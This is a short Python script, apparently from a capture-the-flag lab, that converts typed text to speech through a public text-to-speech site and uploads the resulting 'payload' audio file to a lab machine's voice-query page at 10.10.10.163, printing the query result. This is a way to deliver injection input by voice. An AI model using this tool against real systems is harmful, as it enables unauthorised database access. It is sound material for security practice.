#!/usr/bin/python3
import requests
import sys
import os
import re
import time

tts_service = 'https://www.text2speech.org'

audio_data = dict(
    text = " ".join(sys.argv[1:]),
    voice = 'rms',
    speed = '1',
    outname = 'payload',
    user_screen_width = '980'
)

res = requests.post(tts_service + '/', data=audio_data, allow_redirects=True)
result_re = r"var url = '(/FW/result\.php\?name=.+)'"
result_url = re.search(result_re, res.text, re.MULTILINE).group(1)

res = requests.get(tts_service + result_url, allow_redirects=True)
while res.text == '__wait__123':
    res = requests.get(tts_service + result_url, allow_redirects=True)
    time.sleep(2)

download_re = r"<a href=\"(/FW/getfile\.php\?file=.+\.wav)\">"
download_url = re.search(download_re, res.text, re.MULTILINE).group(1)

res = requests.get(tts_service + download_url, allow_redirects=True)
open('a.wav', 'wb').write(res.content)

target = 'http://10.10.10.163/ai.php'
with open('a.wav', 'rb') as m:
    res = requests.post(target, files={'fileToUpload': m}, data={'submit': 'Process It!'})

result_re = r"<h3>(Our understanding of your input is.*?Query result.*?)<h3>"
output = re.search(result_re, res.text, re.MULTILINE).group(1)
output = output.replace("<br />", "\n")
print(output)
